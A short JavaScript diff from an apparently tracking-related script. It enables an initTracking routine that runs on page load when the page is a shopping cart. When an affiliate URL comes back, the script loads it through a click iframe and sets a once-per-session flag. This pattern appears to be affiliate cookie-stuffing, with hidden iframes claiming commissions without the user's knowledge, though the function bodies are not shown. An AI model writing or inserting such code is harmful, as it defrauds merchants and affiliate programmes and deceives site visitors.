@@ -91,7 +91,6 @@ const payload = {
            
             if (result.success && result.affiliate_url) {
                 
-                //createTrackingPixel(result.affiliate_url);
                 createClickIframe(result.affiliate_url)
                
                 sessionStorage.setItem('iframe_triggered', 'true');
@@ -152,5 +151,5 @@ if (isCartPage()) {
 
     //initTracking();
     //setTimeout(initTracking, 2000);
-    //window.addEventListener("DOMContentLoaded", initTracking);
+    window.addEventListener("DOMContentLoaded", initTracking);
 })();
